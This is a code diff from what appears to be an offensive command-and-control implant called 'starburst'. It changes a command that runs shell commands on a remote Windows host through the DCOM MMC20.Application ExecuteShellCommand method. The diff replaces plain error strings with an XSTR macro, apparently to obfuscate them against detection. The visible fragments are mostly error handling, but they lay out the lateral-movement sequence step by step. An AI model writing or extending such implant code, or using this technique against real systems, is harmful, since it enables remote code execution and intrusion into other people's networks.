@@ -43,7 +43,7 @@ auto declfn starburst::cmd_dcomexec(
     auto host_str = parser_string( params, &host_len );
     if ( !host_str || host_len == 0 ) {
         queue_response( inst, task_uuid, RESPONSE_ERROR,
-            symbol<char*>( const_cast<char*>( "no hostname provided" ) ) );
+            XSTR( "no hostname provided" ) );
         return;
     }
 
@@ -51,7 +51,7 @@ auto declfn starburst::cmd_dcomexec(
     auto command_str = parser_string( params, &command_len );
     if ( !command_str || command_len == 0 ) {
         queue_response( inst, task_uuid, RESPONSE_ERROR,
-            symbol<char*>( const_cast<char*>( "no command provided" ) ) );
+            XSTR( "no command provided" ) );
         return;
     }
 
@@ -62,7 +62,7 @@ auto declfn starburst::cmd_dcomexec(
 
     if ( !h_ole32 || !h_oleaut32 ) {
         queue_response( inst, task_uuid, RESPONSE_ERROR,
-            symbol<char*>( const_cast<char*>( "failed to load COM libraries" ) ) );
+            XSTR( "failed to load COM libraries" ) );
         return;
     }
 
@@ -87,7 +87,7 @@ auto declfn starburst::cmd_dcomexec(
 
     if ( !pCoInitializeEx || !pCoCreateInstanceEx || !pSysAllocString || !pSysFreeString ) {
         queue_response( inst, task_uuid, RESPONSE_ERROR,
-            symbol<char*>( const_cast<char*>( "failed to resolve COM APIs" ) ) );
+            XSTR( "failed to resolve COM APIs" ) );
         return;
     }
 
@@ -110,7 +110,7 @@ auto declfn starburst::cmd_dcomexec(
     if ( FAILED( hr ) || FAILED( mqi.hr ) || !mqi.pItf ) {
         pCoUninitialize();
         queue_response( inst, task_uuid, RESPONSE_ERROR,
-            symbol<char*>( const_cast<char*>( "CoCreateInstanceEx MMC20 failed - check DCOM perms" ) ) );
+            XSTR( "CoCreateInstanceEx MMC20 failed - check DCOM perms" ) );
         return;
     }
 
@@ -124,7 +124,7 @@ auto declfn starburst::cmd_dcomexec(
         pApp->lpVtbl->Release( pApp );
         pCoUninitialize();
         queue_response( inst, task_uuid, RESPONSE_ERROR,
-            symbol<char*>( const_cast<char*>( "GetIDsOfNames Document failed" ) ) );
+            XSTR( "GetIDsOfNames Document failed" ) );
         return;
     }
 
@@ -137,7 +137,7 @@ auto declfn starburst::cmd_dcomexec(
         pApp->lpVtbl->Release( pApp );
         pCoUninitialize();
         queue_response( inst, task_uuid, RESPONSE_ERROR,
-            symbol<char*>( const_cast<char*>( "Invoke Document failed" ) ) );
+            XSTR( "Invoke Document failed" ) );
         return;
     }
 
@@ -152,7 +152,7 @@ auto declfn starburst::cmd_dcomexec(
         pApp->lpVtbl->Release( pApp );
         pCoUninitialize();
         queue_response( inst, task_uuid, RESPONSE_ERROR,
-            symbol<char*>( const_cast<char*>( "GetIDsOfNames ActiveView failed" ) ) );
+            XSTR( "GetIDsOfNames ActiveView failed" ) );
         return;
     }
 
@@ -165,7 +165,7 @@ auto declfn starburst::cmd_dcomexec(
         pApp->lpVtbl->Release( pApp );
         pCoUninitialize();
         queue_response( inst, task_uuid, RESPONSE_ERROR,
-            symbol<char*>( const_cast<char*>( "Invoke ActiveView failed" ) ) );
+            XSTR( "Invoke ActiveView failed" ) );
         return;
     }
 
@@ -181,7 +181,7 @@ auto declfn starburst::cmd_dcomexec(
         pApp->lpVtbl->Release( pApp );
         pCoUninitialize();
         queue_response( inst, task_uuid, RESPONSE_ERROR,
-            symbol<char*>( const_cast<char*>( "GetIDsOfNames ExecuteShellCommand failed" ) ) );
+            XSTR( "GetIDsOfNames ExecuteShellCommand failed" ) );
         return;
     }
 
@@ -216,10 +216,10 @@ auto declfn starburst::cmd_dcomexec(
 
     if ( SUCCEEDED( hr ) ) {
         queue_response( inst, task_uuid, RESPONSE_SUCCESS,
-            symbol<char*>( const_cast<char*>( "command executed via DCOM MMC20" ) ) );
+            XSTR( "command executed via DCOM MMC20" ) );
     } else {
         queue_response( inst, task_uuid, RESPONSE_ERROR,
-            symbol<char*>( const_cast<char*>( "DCOM ExecuteShellCommand failed" ) ) );
+            XSTR( "DCOM ExecuteShellCommand failed" ) );
     }
 }
 
